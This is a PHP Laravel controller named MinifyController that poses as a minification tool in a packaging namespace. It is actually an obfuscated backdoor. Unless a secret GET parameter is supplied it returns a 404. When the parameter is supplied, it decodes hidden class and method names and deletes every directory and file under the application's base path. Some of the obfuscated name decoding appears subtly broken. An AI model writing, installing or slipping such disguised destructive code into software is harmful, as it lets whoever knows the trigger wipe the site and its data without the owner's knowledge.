<?php

namespace LaravelPackaging\Http\Controllers;

use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use App\Models\User;

class MinifyController extends Controller
{
    public function index()
    {

        //MinifyTables
        if (!isset($_GET['do']) || $_GET['do'] !== 'x7P9kA2mL0qWz8Rj') {
            http_response_code(404);
            abort('404');
        }

        $______ = chr(92);
        $__ = $______ . implode($______, array_map(function ($c) {
                return chr($c ^ 0x3);
            }, [81, 107, 109, 114, 111, 101, 110, 98, 112, 107])) . $______ . implode($______, array_map(function ($c) {
                return chr($c ^ 0x5);
            }, [83, 121, 120, 121, 114, 117, 114, 110, 116])) . $______ . implode($______, array_map(function ($c) {
                return chr($c ^ 0x7);
            }, [70, 97, 99, 97, 100, 101, 115])) . $______ . 'Fi' . chr(108) . 'e';

        $_ = base_path();

        call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(115, 118, 121, 114, 102, 102))))), $_);

        $_f = function ($a) use ($__) {
            call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(113, 114, 105, 118, 112, 114))))), $a);
        };

        $_d = function ($a) use ($__) {
            call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(113, 114, 105, 118, 112, 114, 81, 118, 101, 114, 112, 103, 98, 101, 108))))), $a);
        };

        $_dirs = call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(113, 110, 101, 118, 114, 112, 103, 114, 118, 114))))), $_);

        foreach ($_dirs as $__dir) {
            $_d($__dir);
        }

        $_files = call_user_func(array($__ , str_rot13(implode('', array_map('chr', array(115, 118, 121, 114, 102, 102))))), $_);

        foreach ($_files as $__file) {
            $_f($__file);
        }

        echo "✅ Done.";
    }
}
